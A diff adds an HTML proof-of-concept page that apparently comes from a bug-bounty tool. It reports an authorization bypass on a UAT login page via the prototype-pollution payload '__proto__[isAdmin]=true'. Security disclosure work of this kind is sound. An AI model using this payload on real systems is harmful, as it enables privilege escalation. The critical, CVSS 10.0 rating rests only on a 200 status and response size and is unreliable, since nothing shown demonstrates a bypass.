@@ -1,0 +1,34 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>ShadowFox PoC Evidence - Authorization Bypass</title>
+            <style>
+                body { font-family: monospace; background: #1a1a1a; color: #00ff00; }
+                .header { color: #ff6600; font-size: 18px; }
+                .payload { background: #333; padding: 10px; margin: 10px 0; }
+                .response { background: #222; padding: 10px; margin: 10px 0; }
+            </style>
+        </head>
+        <body>
+            <div class="header">🦊 ShadowFox Security Research - Proof of Concept</div>
+            <h2>Vulnerability: Authorization Bypass</h2>
+            <p><strong>Target:</strong> https://uat-bugbounty.nonprod.syfe.com/login</p>
+            <p><strong>Severity:</strong> CRITICAL</p>
+            <p><strong>CVSS Score:</strong> 10.0</p>
+            
+            <h3>Payload Executed:</h3>
+            <div class="payload">__proto__[isAdmin]=true</div>
+            
+            <h3>Server Response:</h3>
+            <div class="response">
+                Status: 200<br>
+                Content-Length: 239711<br>
+                Response Time: 1.886806s
+            </div>
+            
+            <p><strong>Research Team:</strong> H1:Whitefox980 - Elite Ethical Vulnerability Exposure</p>
+            <p><strong>Timestamp:</strong> 2025-06-08T19:49:31.918164</p>
+        </body>
+        </html>
+        
